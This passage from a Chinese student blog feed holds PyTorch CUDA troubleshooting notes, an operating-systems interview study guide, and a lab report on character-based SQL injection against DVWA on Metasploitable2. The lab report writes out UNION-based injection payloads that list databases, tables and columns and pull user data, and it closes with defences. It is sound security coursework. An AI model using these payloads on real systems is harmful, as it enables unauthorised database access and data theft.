this exception using the following code snippet. If that doesn<span class="string">&#x27;t trigger the error, please include your original repro script when reporting this issue.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import torch</span></span><br><span class="line"><span class="string">torch.backends.cuda.matmul.allow_tf32 = False</span></span><br><span class="line"><span class="string">torch.backends.cudnn.benchmark = True</span></span><br><span class="line"><span class="string">torch.backends.cudnn.deterministic = False</span></span><br><span class="line"><span class="string">torch.backends.cudnn.allow_tf32 = True</span></span><br><span class="line"><span class="string">data = torch.randn([256, 64, 56, 56], dtype=torch.float, device=&#x27;</span>cuda<span class="string">&#x27;, requires_grad=True)</span></span><br><span class="line"><span class="string">net = torch.nn.Conv2d(64, 128, kernel_size=[3, 3], padding=[1, 1], stride=[2, 2], dilation=[1, 1], groups=1)</span></span><br><span class="line"><span class="string">net = net.cuda().float()</span></span><br><span class="line"><span class="string">out = net(data)</span></span><br><span class="line"><span class="string">out.backward(torch.randn_like(out))</span></span><br><span class="line"><span class="string">torch.cuda.synchronize()</span></span><br></pre></td></tr></table></figure><p>使用下述命令解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torch.backends.cudnn.enabled = <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-1-9-RuntimeError-CUDA-error-out-of-memory"><a href="#2-1-9-RuntimeError-CUDA-error-out-of-memory" class="headerlink" title="2.1.9 RuntimeError: CUDA error: out of memory"></a>2.1.9 RuntimeError: CUDA error: out of memory</h3><p>上面那个错误解决之后，又报了下面这个错误，麻了😂：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;D:\Code\Paper-code\metaformer\aft\aft_full.py&quot;</span>, line <span class="number">25</span>, <span class="keyword">in</span> forward</span><br><span class="line">num = torch.exp(w_bias) @ (torch.exp(k) * v)</span><br><span class="line">RuntimeError: CUDA error: out of memory</span><br><span class="line">CUDA kernel errors might be asynchronously reported at some other API call,so the stacktrace below might be incorrect.</span><br><span class="line">For debugging consider passing CUDA_LAUNCH_BLOCKING=<span class="number">1.</span></span><br></pre></td></tr></table></figure><p>这个错误 <code>RuntimeError: CUDA error: out of memory</code> 表明 GPU 内存不足以执行当前的运算。这通常发生在处理大型数据集或复杂模型时，特别是当所有输入、模型参数和中间结果都存储在 GPU 上时。</p><p>把batch_size从1024调至128，可以成功运行。</p><hr><h1 id="3-训练"><a href="#3-训练" class="headerlink" title="3 训练"></a>3 训练</h1><h2 id="3-1-模型太大"><a href="#3-1-模型太大" class="headerlink" title="3.1 模型太大"></a>3.1 模型太大</h2><p>训练的时候感觉速度很慢，听学长的看了一下模型大小，发现<code>14G</code>，改小一点吧。</p><p>现在回头看，原来这是个大坑，改小也没让你改那么小啊🤪</p>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 夏令营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验5：SQL注入（字符注入）</title>
      <link href="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-判断注入点与注入类型"><a href="#2-1-判断注入点与注入类型" class="headerlink" title="2.1 判断注入点与注入类型"></a>2.1 <strong>判断注入点与注入类型</strong></h2><p>（1）分别测试输入：1及1”</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_wD3fxn1YjW.png"></p><center>图2.1  判断注入类型：输入1</center><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_1_8UUFzySLWs.png"></p><center>图2.2  判断注入类型：输入1”</center><p>由图2.2所示，从网页的url可知，页面采用GET方法提交数据，并且输入“１””后能够正确得到查询结果，所以推测注入类型为字符注入。</p><p>（2）测试输入：1及1’</p><p>之后输入１’进行测试，数据库报错如图2.3，这个错误提示是在使用MySQL数据库时，使用的SQL语法有问题，具体是在’1’处，所以可以推测SQL语句的闭合方式是单引号，并发现数据库为MySQL。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_2__uUW8lzguD.png"></p><center>图2.3  判断注入类型：输入1’</center><p>（3）测试输入：1 and 1 &#x3D; 1和1 and 1 &#x3D; 2</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_3_1Q2_CJdA8g.png"></p><center>图2.4  判断注入类型：输入1 and 1 = 1</center><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_4_zhCfByLQ3W.png"></p><center>图2.5  判断注入类型：输入1 and 1 = 2</center><p>由图2.4和图2.5所示，查询的结果都是相当于查询id&#x3D;1的结果，现在来分析一下为什么会这样。通过上面的分析，可以推断这是一个字符注入，所以说输入的数据会被当作一个字符串插入到SQL语句中，由于查询的id是一个整型，所以它会从当前输入的字符串中识别第一个数字并进行查询，所以我们只要在第一个数字1的后面加上空格后，不管后面输入什么都是相当于查询id&#x3D;1的数据。</p><p>如果不为字符型注入，那么就不会当作一个字符串插入到SQL语句中进行查询，那么执行的时候肯定会报错。</p><p>（4）测试输入：1’ and ‘1’ &#x3D; ‘1</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_5_t5Kg7p8bha.png"></p><center>图2.6  判断注入类型：输入1’ and ‘1’ = ‘1</center><p>由此可以发现注入类型为字符型注入，且是以单引号结束。</p><h2 id="2-2-获取SQL语句中的字段数"><a href="#2-2-获取SQL语句中的字段数" class="headerlink" title="2.2 获取SQL语句中的字段数"></a>2.2 <strong>获取SQL语句中的字段数</strong></h2><p>使用order by来判断SQL语句中由多少个字段，</p><p>（1）输入：１’ order by 1#</p><p>order by 1表示按照第一个列进行排序。在SQL中，`order by`子句用于指定查询结果的排序方式，后面可以跟列名或者列的位置（从1开始计数）。因此，`order by 1`表示按照第一个列（查询结果中的第一个列）进行升序排序。`#`符号是SQL中的注释符号，表示后面的内容将被忽略。因此，整个SQL语句的含义是选择数据并按照第一个列进行排序。</p><p>结果如图2.7所示，可以看成执行查询成功，所以SQL语句中字段数大于等于１。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_6_eOTUXzWhvm.png"></p><center>图2.7  判断注入类型：输入1’ order by 1#</center><p>（2）输入：1’ order by 2#</p><p>结果如图2.8所示，可以看成执行查询成功，所以SQL语句中字段数大于等于2。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_7_WGIMic_K1n.png"></p><center>图2.8  判断注入类型：输入1’ order by 2#</center><p>（3）输入：1’ order by 3#</p><p>结果如图2.9所示，查询失败，所以可以确定SQL语句中查询字段数为2。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_8_Fpeofg9-kh.png"></p><center>图2.9  判断注入类型：输入1’ order by 3#</center><h2 id="2-3-判断回显位置"><a href="#2-3-判断回显位置" class="headerlink" title="2.3 判断回显位置"></a>2.3 <strong>判断回显位置</strong></h2><p>判断回显位置用来判断目标信息的输出位置，使用union关键字进行分析。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_9_RaLNPcq95Y.png"></p><center>图2.10  判断回显位置</center><p>如图2.10所示，查询结果的显示位置是在First name和Surname字段之后。</p><h2 id="2-4-获取数据库信息"><a href="#2-4-获取数据库信息" class="headerlink" title="2.4 获取数据库信息"></a>2.4 <strong>获取数据库信息</strong></h2><p>输入：1’ union select 1,database()#，如图2.11所示，可以得到数据库名为“dvwa”。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_10_FCaHQgvVGO.png"></p><center>图2.11  获取数据库信息</center><h2 id="2-5-获取数据库中表名"><a href="#2-5-获取数据库中表名" class="headerlink" title="2.5 获取数据库中表名"></a>2.5 <strong>获取数据库中表名</strong></h2><p>输入：1’ union select 111,table_name from information_schema.tables where table_schema&#x3D;’dvwa’#。如图2.12所示，可以得到数据库dvwa中有2个表，分别为guestbook和users。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_11_Y79F89kmnQ.png"></p><center>图2.12  获取数据库中的表名</center><h2 id="2-6-获取数据库中表中字段名"><a href="#2-6-获取数据库中表中字段名" class="headerlink" title="2.6 获取数据库中表中字段名"></a>2.6 <strong>获取数据库中表中字段名</strong></h2><p>这里查询users表中的列名，输入：1’ union select 111,column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’users’#，如图2.13所示。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_12_x6Pu19Vkqn.png"></p><center>图2.13  获取users表中的字段名</center><p>可以得到users表中一共有user_id、first_name、last_name、user、password和avatar6个列。</p><h2 id="2-7-获取字段中的值"><a href="#2-7-获取字段中的值" class="headerlink" title="2.7 获取字段中的值"></a>2.7 <strong>获取字段中的值</strong></h2><p>获取users表中的user_id和avatar字段数据为例，输入：1’ union select user_id,  avatar from users #，如图2.14所示，查询得到了所有的用户id以及对应的头像。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_13_Cz8T117AH8.png"></p><center>图2.14  获取users表中的user\_id和avatar字段</center><h2 id="2-8-通过SQL注入获取guestbook表中的字段"><a href="#2-8-通过SQL注入获取guestbook表中的字段" class="headerlink" title="2.8 通过SQL注入获取guestbook表中的字段"></a>2.8 <strong>通过SQL注入获取guestbook表中的字段</strong></h2><p>要获取guestbook表中的字段值，可以使用类似上述的查询语句，输入：1’ union select 111,column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’guestbook’#，查询结果如图2.15所示。</p><p><img src="/2024/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%89/image_14_5D01-31JLW.png"></p><center>图2.15  获取guestbook表中的字段名</center><p>可以看到guestbook表中的信息有comment_id、comment和name，之后也可以查询一些guestbook表中的其他信息，过程与上面查询users表类似，不再赘述。</p><h2 id="2-9-防止SQL注入攻击"><a href="#2-9-防止SQL注入攻击" class="headerlink" title="2.9 防止SQL注入攻击"></a>2.9 <strong>防止SQL注入攻击</strong></h2><p>防止字符型SQL注入攻击的关键在于正确地对用户输入进行处理和验证，以确保不会在SQL查询中执行恶意代码，防范字符型SQL注入攻击可以采用以下方法。</p><ol><li><strong>使用参数化查询</strong>：使用参数化查询（Prepared Statements）是防范SQL注入攻击的最佳方式之一。参数化查询能够将用户输入的数据与SQL查询逻辑分离，数据库系统会将输入数据视为数据而不是代码，从而防止恶意代码的注入。</li><li><strong>使用</strong>**<code>ORM</code>**<strong>框架</strong>：使用<code>ORM</code>（Object-Relational Mapping）框架可以避免直接编写SQL查询，它们通常会自动处理参数化查询，从而降低了SQL注入攻击的风险。</li><li><strong>输入验证和过滤</strong>：对用户输入的数据进行验证和过滤，只允许预期的数据类型和格式通过。例如，如果用户只应该输入数字，则验证输入是否为数字，如果用户只能输入字母，则确保输入仅包含字母等。</li><li><strong>避免动态拼接SQL查询</strong>：避免在代码中动态拼接SQL查询，特别是直接将用户输入作为SQL查询的一部分。即使对用户输入进行了过滤和验证，也不应该信任用户输入直接构建SQL查询。</li></ol><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><ol><li>通过SQL注入，攻击者可以基本上可以获得数据库的任何信息，同时，我也了解到，攻击者可以通过SQL注入来获取数据库所在平台的一些文件，并进行篡改。</li><li>本次实验虽然步骤较简单，但是需要我们对基本的SQL语句的语法有一定的了解，并且要有学习数据库相关的知识，了解基本的数据库类型。不能仅仅把每一个步骤的实验结果图截下来就行了，而是要理解其背后的原理。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统面经3：内存管理</title>
      <link href="/2024/07/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2024/07/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/07/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/image_-WzSsh8AuJ.png"></p><h1 id="1-存储器管理应具有的功能？"><a href="#1-存储器管理应具有的功能？" class="headerlink" title="1 存储器管理应具有的功能？"></a>1 存储器管理应具有的功能？</h1><p>存储管理的主要任务是为多道程序的运行提供良好的环境，方便用户使用存储器，提高存储器的利用率以</p><p>及从逻辑上扩充存储器，故应具有以下功能：</p><ol><li><strong>内存的分配和回收</strong>：实施内存的分配，回收系统或用户释放的内存空间。</li><li><strong>地址变换</strong>：提供地址变换功能，将逻辑地址转换成物理地址。</li><li><strong>扩充内存</strong>：借助于虚拟存储技术活其他自动覆盖技术，为用户提供比内存空间大的地址空间，从逻辑上扩充内存。</li><li><strong>存储保护</strong>：保证进入内存的各道作业都在自己的存储空间内运行，互不干扰。</li></ol><hr><h1 id="2-将用户程序变为可在内存中执行的程序的步骤？"><a href="#2-将用户程序变为可在内存中执行的程序的步骤？" class="headerlink" title="2 将用户程序变为可在内存中执行的程序的步骤？"></a>2 将用户程序变为可在内存中执行的程序的步骤？</h1><ol><li><strong>编译</strong>：由编译程序将用户源代码编译成若干目标模块</li><li><strong>链接</strong>：由链接程序将编译后形成的一组目标模块及所需的库函数链接在一起，形成一个完整的装入模块</li><li><strong>装入</strong>：由装入程序将装入模块装入内存中运行</li></ol><p><img src="/2024/07/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/image_Z94p0JNnvh.png"></p><hr><h1 id="3-程序的链接方式有哪些？"><a href="#3-程序的链接方式有哪些？" class="headerlink" title="3 程序的链接方式有哪些？"></a>3 程序的链接方式有哪些？</h1><ol><li><strong>静态链接</strong>：在程序运行之前，先把各个目标模块及所需库链接为一个完整的可执行程序，以后不再拆开。</li><li><strong>装入时动态链接</strong>：将应用程序编译后所得到的一组目标模块在装入内存时采用边装入边链接的链接方式。</li><li><strong>运行时动态链接</strong>：知道程序运行过程中需要一些模块时，才对这些模块进行链接。</li></ol><hr><h1 id="4-程序的装入方式有哪些？"><a href="#4-程序的装入方式有哪些？" class="headerlink" title="4 程序的装入方式有哪些？"></a>4 程序的装入方式有哪些？</h1><ol><li><strong>绝对装入</strong>：在编译时就知道程序将要驻留在内存的物理地址，编译程序产生含有物理地址的目标代码，不适合多道程序设计。</li><li><strong>可重定位装入</strong>：根据内存当前情况，将装入模块装入到内存的适当位置，地址变换通常在装入时一次完成，之后不再改变，也称静态重定位。当操作系统为程序分配一个以某地址为起始地址的连续主存区域后，重定位时将程序中指令或操作数的逻辑地址加上这个起始地址就得到了物理地址。</li><li><strong>动态运行装入</strong>：允许程序运行时在内存中移动位置，把装入模块装入到内存后的所有地址都是相对地址，在程序执行过程中每当访问到相应指令或数据时，才将要 访问的程序或数据的相对地址转换为物理地址。动态重定位的实现要依靠硬件地址变换机构。</li></ol><hr><h1 id="5-覆盖技术和交换技术？"><a href="#5-覆盖技术和交换技术？" class="headerlink" title="5 覆盖技术和交换技术？"></a>5 覆盖技术和交换技术？</h1><h2 id="5-1-覆盖技术"><a href="#5-1-覆盖技术" class="headerlink" title="5.1 覆盖技术"></a>5.1 覆盖技术</h2><p>把一个大的程序划分为一系列覆盖，每个覆盖是一个相对独立的程序单位，把程序执行时并不要求同时装入内存的覆盖组成一组，成为覆盖段，这个覆盖段分配到同一个存储区域，这个存储区域成为覆盖区，它与覆盖段一一对应。</p><p>覆盖段的大小由覆盖段中最大的覆盖来确定。（为了解决内存容量太小的问题，打破了必须将一个程序全部信息装入内存后才能运行的限制）</p><h2 id="5-2-交换技术"><a href="#5-2-交换技术" class="headerlink" title="5.2 交换技术"></a>5.2 交换技术</h2><p>把暂时不用的某个程序及数据部分从内存移到外存中去，以便腾出必要的内存空间；或者把指定的程序或数据从外存读到相应的内存中，并将控制权交给他，让其在系统上运行的一种内存扩充技术。处理器的中级调度就是采用交换技术。</p><h2 id="5-3-区别"><a href="#5-3-区别" class="headerlink" title="5.3 区别"></a>5.3 区别</h2><ol><li><p>与覆盖技术相比，交换技术不要求程序员给出的 程序段之间的覆盖结构；</p></li><li><p>交换技术主要在进程和作业之间进行，覆盖技术主要在同一个进程或作业中进行；</p><p>交换技术主要在进程和作业之间进行，覆盖技术主要在同一个进程或作业中进行；</p></li><li><p>覆盖技术只能覆盖于覆盖程序段无关的程序段，交换进程由换出和换入两个过程组成。</p><p>覆盖技术只能覆盖于覆盖程序段无关的程序段，交换进程由换出和换入两个过程组成。</p></li></ol><hr><h1 id="6-内存连续分配管理方式有哪些？"><a href="#6-内存连续分配管理方式有哪些？" class="headerlink" title="6 内存连续分配管理方式有哪些？"></a>6 内存连续分配管理方式有哪些？</h1><h2 id="6-1-单一连续分配"><a href="#6-1-单一连续分配" class="headerlink" title="6.1 单一连续分配"></a>6.1 单一连续分配</h2><p>内存在此方式下分为<strong>系统区</strong>和<strong>用户区</strong>，系统区仅提供给操作系统使用，通常在低地址部分；用户区是为用户提供的、除系统区之外的内存空间。这种方式无需进行内存保护。</p><ul><li><strong>优点</strong>：简单、无外部碎片，可以釆用覆盖技术，不需要额外的技术支持</li><li><strong>缺点</strong>：只能用于单用户、单任务的操作系统中，有内部碎片，存储器的利用率极低</li></ul><h2 id="6-2-固定分区分配"><a href="#6-2-固定分区分配" class="headerlink" title="6.2 固定分区分配"></a>6.2 固定分区分配</h2><p>固定分区分配是最简单的一种多道程序存储管理方式，它<strong>将用户内存空间划分为若干个固定大小的区域</strong>，每个分区只装入一道作业。当有空闲分区时，便可以再从外存的后备作业队列中，选择适当大小的作业装入该分区，如此循环。</p><p>固定分区分配在划分分区时，有两种不同的方法。</p><ol><li>分区大小相等：用于利用一台计算机去控制多个相同对象的场合，缺乏灵活性</li><li>分区大小不等：划分为含有多个较小的分区、适量的中等分区及少量的大分区</li></ol><h2 id="6-3-动态分区分配"><a href="#6-3-动态分区分配" class="headerlink" title="6.3 动态分区分配"></a>6.3 动态分区分配</h2><p>动态分区分配又称为可变分区分配，是一种动态划分内存的分区方法。这种分区方法不预先将内存划分，而是在进程装入内存时，<strong>根据进程的大小动态地建立分区</strong>，并使分区的大小正好适合进程的需要。因此系统中分区的大小和数目是可变的。</p><p>在进程装入或换入主存时，如果内存中有多个足够大的空闲块，操作系统必须确定分配哪个内存块给进程使用，这就是动态分区的分配策略，考虑以下几种算法：</p><ol><li><strong>首次适应</strong>（First Fit）算法：空闲分区以地址递增的次序链接。分配内存时顺序查找，找到大小能满足要求的第一个空闲分区。</li><li><strong>最佳适应（</strong>Best Fit）算法：空闲分区按容量递增形成分区链，找到第一个能满足要求的空闲分区。</li><li><strong>最坏适应</strong>（Worst Fit）算法：又称最大适应（Largest Fit）算法，空闲分区以容量递减的次序链接。找到第一个能满足要求的空闲分区，也就是挑选出最大的分区。</li><li><strong>邻近适应</strong>（Next Fit）算法：又称循环首次适应算法，由首次适应算法演变而成。不同之处是分配内存时从上次查找结束的位置开始继续查找。</li></ol><hr><h1 id="7-页面置换算法有哪些？"><a href="#7-页面置换算法有哪些？" class="headerlink" title="7 页面置换算法有哪些？"></a>7 页面置换算法有哪些？</h1><h2 id="7-1-最佳（OPT）置换算法"><a href="#7-1-最佳（OPT）置换算法" class="headerlink" title="7.1 最佳（OPT）置换算法"></a>7.1 最佳（OPT）置换算法</h2><p>从主存中移出永远不再需要的页面；如无这样的页面存在，则选择最长时间不需要访问的页面。于所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面，这样可以保证获得最低的缺页率。</p><p>被淘汰页面是以后永不使用或最长时间内不再访问的页面。（往后看）</p><h2 id="7-2-先进先出（FIFO）置换算法"><a href="#7-2-先进先出（FIFO）置换算法" class="headerlink" title="7.2 先进先出（FIFO）置换算法"></a>7.2 先进先出（FIFO）置换算法</h2><p>是最简单的页面置换算法。这种算法的基本思想是：当需要淘汰一个页面时，总是选择驻留主存时间最长的页面进行淘汰，即先进入主存的页面先淘汰。</p><p>其理由是：<strong>最早调入主存的页面不再被使用的可能性最大</strong>。 即优先淘汰最早进入内存的页面。（往前看）</p><h2 id="7-3-最近最久未使用（LRU）算法"><a href="#7-3-最近最久未使用（LRU）算法" class="headerlink" title="7.3 最近最久未使用（LRU）算法"></a>7.3 最近最久未使用（LRU）算法</h2><p>这种算法的基本思想是：利用局部性原理，根据一个作业在执行过程中过去的页面访问历史来推测未来的行为。它认为过去一段时间里不曾被访问过的页面，在最近的将来可能也不会再被访问。</p><p>所以，这种算法的实质是：当需要淘汰一个页面时，总是选择在最近一段时间内最久不用的页面予以淘汰。 即淘汰最近最长时间未访问过的页面。（往前看）</p><h2 id="7-4-时钟（CLOCK）置换算法"><a href="#7-4-时钟（CLOCK）置换算法" class="headerlink" title="7.4 时钟（CLOCK）置换算法"></a>7.4 时钟（CLOCK）置换算法</h2><p><code>LRU</code>算法的性能接近于OPT，但是实现起来比较困难，且开销大；FIFO算法实现简单，但性能差。所以操作系统的设计者尝试了很多算法，试图用比较小的开销接近<code>LRU</code>的性能，这类算法都是CLOCK算法的变体。</p><p>简单的CLOCK算法是给每一帧关联一个附加位，称为使用位。当某一页首次装入主存时，该帧的使用位设置为1；当该页随后再被访问到时，它的使用位也被置为1。</p><p>对于页替换算法，用于替换的候选帧集合看做一个循环缓冲区，并且有一个指针与之相关联。当某一页被替换时，该指针被设置成指向缓冲区中的下一帧。当需要替换一页时，操作系统扫描缓冲区，以查找使用位被置为0的一帧。每当遇到一个使用位为1的帧时，操作系统就将该位重新置为0；</p><p>如果在这个过程开始时，缓冲区中所有帧的使用位均为0，则选择遇到的第一个帧替换；如果所有帧的使用位均为1，则指针在缓冲区中完整地循环一周，把所有使用位都置为0，并且停留在最初的位置上，替换该帧中的页。</p><p>由于该算法循环地检查各页面的情况，故称为CLOCK算法，又称为最近未用（Not Recently Used, NRU）算法。</p><hr><h1 id="8-什么是页表和快表，有什么作用？"><a href="#8-什么是页表和快表，有什么作用？" class="headerlink" title="8 什么是页表和快表，有什么作用？"></a>8 什么是页表和快表，有什么作用？</h1><p>页表指出逻辑地址中的页号与所占主存块号的对应关系。</p><ul><li><strong>作用</strong>：页式存储管理在用动态重定位方式装入作业时，要利用页表做地址转换工作。</li></ul><p>快表就是存放在高速缓冲存储器的部分页表。它起页表相同的作用。由于采用页表做地址转换，读写内存数据时CPU要访问两次主存。有了快表，有时只要访问一次高速缓冲存储器，一次主存，这样可加速查找并提高指令执行速度。</p><hr><h1 id="9-地址翻译的过程？"><a href="#9-地址翻译的过程？" class="headerlink" title="9 地址翻译的过程？"></a>9 地址翻译的过程？</h1><p>TLB→页表（TLB不命中）→Cache→主存（Cache不命中）→外存</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统面经2：进程管理</title>
      <link href="/2024/07/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2024/07/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/07/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/image_5xh3qhLFua.png"></p><h1 id="1-进程与线程？"><a href="#1-进程与线程？" class="headerlink" title="1 进程与线程？"></a>1 进程与线程？</h1><h2 id="1-1-进程的概念与定义"><a href="#1-1-进程的概念与定义" class="headerlink" title="1.1 进程的概念与定义"></a>1.1 进程的概念与定义</h2><p>在多道程序环境下，允许多个进程并发执行，此时他们将失去封闭性，并具有间断性及不可再现性的特征。为此引入了进程的概念，以便更好地描述和控制程序的并发执行，实现操作系统的并发性和共享性。</p><p>进程是程序的运行过程，是系统进行资源分配和调度的一个独立单位。</p><h2 id="1-2-线程的概念和定义"><a href="#1-2-线程的概念和定义" class="headerlink" title="1.2 线程的概念和定义"></a>1.2 线程的概念和定义</h2><p>早期，在OS中能拥有资源和独立运行的基本单位是进程，然而随着计算机技术的发展，进程出现了很多弊端：</p><ol><li>由于进程是资源拥有者，创建、撤消与切换存在较大的时空开销，因此需要引入轻型进程</li><li>二是由于对称多处理机（<code>SMP</code>）出现，可以满足多个运行单位，而多个进程并行开销过大</li></ol><p>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，每条线程执行不同的任务。</p><h2 